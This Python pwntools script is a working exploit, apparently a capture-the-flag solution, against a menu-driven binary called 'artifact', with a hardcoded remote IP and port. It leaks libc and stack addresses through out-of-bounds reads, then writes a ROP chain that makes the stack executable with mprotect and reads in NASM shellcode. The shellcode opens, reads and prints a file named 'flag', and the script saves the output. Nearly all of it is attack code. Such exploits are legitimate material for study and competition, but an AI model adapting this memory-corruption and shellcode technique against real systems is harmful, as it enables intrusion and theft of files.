from __future__ import division, print_function
from pwn import *
# import fn; from fn import _
import re

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    conn = remote('52.192.178.153', 31337)
else:
    conn = process('./artifact')
    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
        gdb.attach(conn)
        sleep(2)

def compile_shellcode(shellcode, filename):
        fd = open(filename + ".s", "wb")
        fd.write(shellcode)
        fd.close()
        ret = subprocess.call("sh -c 'nasm {0}.s -o {0}.o -f elf64; objcopy {0}.o -j .text {0} -O binary'".format(filename), shell=True)
        if ret != 0:
            print("Failed to compile")
            sys.exit(1)
        
        fd = open(filename, "rb")
        buf = fd.read()
        fd.close()
        return buf

def write_idx(idx, num):
    text = conn.recvuntil('Choice?')
    conn.sendline('2 ' + str(idx) + " " + str(num)) # local testing

def get_value(idx):
        text = conn.recvuntil('Choice?')
        conn.sendline('1 ' + str(idx))
        conn.recvuntil("Here it is: ")
        value = conn.recvuntil("\n")
        return int(value)

libc_start_main = get_value(203)
stack_address = get_value(200) & 0xfffffffffffff000
print(hex(stack_address))

# This is all for my own libc
#libc_base = 0x7ffff7a0d000
#stack_address = 0x7ffffffdd000

if not "remote" in sys.argv:
    libc_base = libc_start_main - (0x20740 + 0xf0)
    read_addr = libc_base + 0xf7220 
    write_addr = libc_base + 0xf7280
    mmap_addr = libc_base + 0x101640
    mprotect_addr = libc_base + 0x101730

    pop_rdi = libc_base + 0x21102
    pop_rsi = libc_base + 0x202e8
    pop_rdx = libc_base + 0x1b92
    pop_rcx = libc_base + 0xd20a3
    pop_r8  = libc_base + 0x1350f6

else:
    libc_base = libc_start_main - 0x0203F1
    read_addr = libc_base + 0xF8880 
    mprotect_addr = libc_base + 0x102CA0

    pop_rdi = libc_base + 0x000000000001fd7a
    pop_rsi = libc_base + 0x000000000001fcbd
    pop_rdx = libc_base + 0x0000000000001b92

asm = (
"""
mov rdi, 0x414100000000
mov rsi, 0x1000
mov rdx, 6
mov r10, 0x32
mov r8, -1
mov r9, 0
mov rax, 9 ; mmap
syscall

mov rsi, 0x414100000000
mov rdi, 1734437990
mov [rsi], rdi

mov rdi, 0x414100000000
mov rsi, 0 ; O_RDONLY
mov rdx, 2
mov rax, 2 ; open
syscall

mov r15, rax

mov rdi, r15
mov rsi, 0x414100000000
mov rdx, 0x1000
mov rax, 0 ; read
syscall

mov rdi, 1
mov rsi, 0x414100000000
mov rdx, 0x1000
mov rax, 1 ; write
syscall
""")

asm = ("nop\n" * 20) + asm
shellcode = compile_shellcode(asm, "shellcode")

print("compiled")




#rop chain!!
payload = ""

write_idx(203, pop_rdi) # addr
write_idx(204, stack_address)
write_idx(205, pop_rsi) # size
write_idx(206, 0x2000)
write_idx(207, pop_rdx) # prot
write_idx(208, 6)
write_idx(209, mprotect_addr)

write_idx(210, pop_rdi) # fd
write_idx(211, 0) # stdin
write_idx(212, pop_rsi) # size
write_idx(213, stack_address)
write_idx(214, pop_rdx) # prot
write_idx(215, 0x1000)
write_idx(216, read_addr)

write_idx(217, stack_address)

text = conn.recvuntil('Choice?')
conn.sendline('3')

conn.sendline(shellcode)

context.log_level = 'debug'

fd = open("output", "wb")
while True:
    buf = conn.read(1)
    fd.write(buf)
fd.close()

#conn.interactive()

